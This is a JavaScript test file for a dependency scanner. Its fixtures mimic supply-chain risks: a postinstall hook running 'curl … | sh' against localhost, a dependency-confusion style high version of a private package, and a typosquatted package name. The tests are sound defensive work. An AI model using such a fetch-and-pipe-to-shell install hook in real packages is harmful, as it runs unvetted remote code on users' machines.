const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');

const PackageScanner = require('./package-scanner');

function mkTmpDir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'pkg-scanner-'));
}

function writeJson(filePath, value) {
  fs.mkdirSync(path.dirname(filePath), { recursive: true });
  fs.writeFileSync(filePath, JSON.stringify(value, null, 2), 'utf8');
}

test('scanner detects lifecycle install scripts in node_modules packages', async () => {
  const root = mkTmpDir();
  writeJson(path.join(root, 'package.json'), {
    name: 'demo',
    dependencies: { demo: '1.0.0' }
  });
  writeJson(path.join(root, 'node_modules', 'demo', 'package.json'), {
    name: 'demo',
    version: '1.0.0',
    scripts: {
      postinstall: 'curl http://127.0.0.1/install.sh | sh'
    }
  });
  fs.writeFileSync(path.join(root, 'node_modules', 'demo', 'index.js'), 'module.exports = {};', 'utf8');

  const scanner = new PackageScanner(root);
  const result = await scanner.scan();

  const hasLifecycleFinding = result.findings.some((f) => f.type === 'INSTALL_LIFECYCLE_SCRIPT');
  const hasNetworkFinding = result.findings.some((f) => f.type === 'SUSPICIOUS_SCRIPT_NETWORK');
  assert.equal(hasLifecycleFinding, true);
  assert.equal(hasNetworkFinding, true);
});

test('scanner returns non-zero exitCode for critical high version', async () => {
  const root = mkTmpDir();
  writeJson(path.join(root, 'package.json'), {
    name: 'demo',
    dependencies: { '@corp/private': '999.1.0' }
  });
  writeJson(path.join(root, 'node_modules', '@corp', 'private', 'package.json'), {
    name: '@corp/private',
    version: '999.1.0'
  });

  const scanner = new PackageScanner(root);
  const result = await scanner.scan();
  assert.equal(result.exitCode, 2);
  assert.equal(result.stats.criticalFindings > 0, true);
});

test('scanner produces valid SARIF envelope', async () => {
  const root = mkTmpDir();
  writeJson(path.join(root, 'package.json'), {
    name: 'demo',
    dependencies: { expresss: '1.0.0' }
  });
  const scanner = new PackageScanner(root);
  const result = await scanner.scan();
  const sarif = scanner.toSarif(result);

  assert.equal(sarif.version, '2.1.0');
  assert.ok(Array.isArray(sarif.runs));
  assert.ok(Array.isArray(sarif.runs[0].results));
});
